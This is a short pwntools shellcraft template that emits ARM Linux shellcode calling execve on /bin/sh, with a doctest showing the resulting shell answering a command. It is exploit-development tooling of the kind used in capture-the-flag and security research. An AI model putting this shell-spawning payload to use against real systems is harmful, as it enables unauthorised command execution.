<% from pwnlib.shellcraft import arm %>
<%docstring>
Execute a different process.

    >>> p = run_assembly(shellcraft.arm.linux.sh())
    >>> p.sendline(b'echo Hello')
    >>> p.recv()
    b'Hello\n'

</%docstring>
    ${arm.linux.execve('/bin///sh', ['sh'], 0)}
